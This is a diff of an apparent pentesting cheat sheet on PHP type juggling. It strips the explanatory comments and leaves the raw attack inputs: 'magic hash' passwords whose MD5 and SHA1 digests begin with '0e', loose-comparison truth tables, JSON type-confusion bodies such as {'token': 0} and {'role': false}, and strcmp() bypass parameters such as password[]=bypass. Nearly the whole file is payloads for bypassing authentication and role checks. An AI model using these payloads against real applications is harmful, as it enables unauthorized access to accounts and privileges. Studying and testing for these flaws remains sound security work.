@@ -1,12 +1,3 @@
-# ============================================================
-# Type Juggling — PHP Loose Comparison (==)
-# ============================================================
-
-# ---- Magic Hash Values (MD5) ----
-# These MD5 hashes start with "0e" — treated as 0 in scientific notation
-# If password hash compared with ==, all "0e..." hashes equal each other
-
-# Password → MD5 hash starting with "0e"
 240610708    → 0e462097431906509019562988736854
 QNKCDZO      → 0e830400451993494058024219903391
 aabg74hLkLPH → 0e927099952048198114750551801959
@@ -18,17 +9,8 @@ aa3OFF9m     → 0e36977786278517996959966E+77
 0e1137126905 → 0e291659922323405260514745084877
 0e215962017  → 0e291242476940776845150308577824
 
-# ---- SHA1 Magic Hashes ----
 sha1("aaroZmOk") = 0e66507019969427134894567494305...
-# Find more: https://github.com/spaze/hashes
 
-# ---- Type Juggling with == ----
-# PHP: "0" == false → true
-# "0" == null → false
-# "" == false → true
-# "" == null → true
-# "php" == 0 → true (before PHP 8)
-# "1abc" == 1 → true (before PHP 8)
 0 == "foo"        # true (PHP 7)
 0 == ""           # true (PHP 7)
 0 == "0"          # true
@@ -43,26 +25,13 @@ sha1("aaroZmOk") = 0e66507019969427134894567494305...
 "0" == 0          # true
 "0" == null       # false (!)
 
-# ---- JSON Type Confusion ----
-# If PHP decodes JSON and compares: if ($input == 0)
 {"token": 0}
 {"token": false}
 {"token": null}
 {"token": "0"}
 
-# ---- strcmp() Bypass ----
-# strcmp(NULL, "string") returns 0 in some PHP versions
-# POST data arrays: password[]=anything → strcmp returns 0
-# ?password[]=anything
 password[]=bypass
 token[]=bypass
 
-# ---- in_array() Loose Match ----
-# in_array(0, ["admin","user"]) → true (PHP 7 loose mode)
-# Bypass: send integer 0 as value
 {"role": 0}
 {"role": false}
-
-# ---- switch() Type Juggling ----
-# switch uses loose comparison
-# switch("foo") { case 0: ... } → matches!
